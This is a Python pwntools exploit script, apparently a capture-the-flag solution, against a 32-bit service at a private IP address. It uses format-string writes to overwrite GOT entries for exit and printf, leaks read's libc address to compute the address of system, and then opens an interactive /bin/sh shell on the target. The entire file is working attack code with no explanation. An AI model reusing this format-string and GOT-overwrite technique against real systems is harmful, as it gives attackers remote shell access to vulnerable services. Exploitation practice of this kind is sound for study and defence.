#!/usr/bin/python

import sys,string
from pwn import *

#libc = ELF("./libc-32.so")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#context.log_level = 'debug'
#p = process('./pwn1')
p = remote('10.105.42.5', 2333)
p.recvuntil('Welcome~\n')

system_libc = libc.symbols['system']
read_libc = libc.symbols['read']
#print system_libc, read_libc

read_plt = 0x0804a010
exit_plt = 0x0804a024  #write to 0x0804866B to loop 
print_plt = 0x0804a014 # write to system_addr

payload = p32(exit_plt + 2) + p32(exit_plt) + '%.2044u%7$hn' + '%.32359u%8$hn'
p.sendline(payload)
p.recvuntil('\n')

payload = p32(read_plt) + '%7$s' 
p.sendline(payload)
leak_read_addr = p.recvuntil('\n')[4:8]

read_addr = leak_read_addr[3] + leak_read_addr[2] + leak_read_addr[1] + leak_read_addr[0]

system_addr = int(read_addr.encode('hex'),16) - (read_libc - system_libc)
print hex(int(read_addr.encode('hex'),16)), hex(system_addr)
#p.recvuntil('\n')

low_system_addr = (system_addr & 0xffff)
high_system_addr = (system_addr & 0xffff0000) >> 16
print hex(low_system_addr) , hex(high_system_addr)

if low_system_addr > high_system_addr:
    su = high_system_addr - 8
    bu = low_system_addr - high_system_addr
    payload = p32(print_plt + 2) + p32(print_plt) + '%.{}u%7$hn'.format(su) + '%.{}u%8$hn'.format(bu)

if low_system_addr < high_system_addr:
    su = low_system_addr - 8
    bu = high_system_addr - low_system_addr
    payload = p32(print_plt) + p32(print_plt + 2) + '%.{}u%7$hn'.format(su) + '%.{}u%8$hn'.format(bu)
    
p.sendline(payload)
p.recvuntil('\n')
p.sendline("/bin/sh")
try:
    p.interactive()
except KeyboardInterrupt:
    print "[+] Goodbye.."
    sys.exit(1)
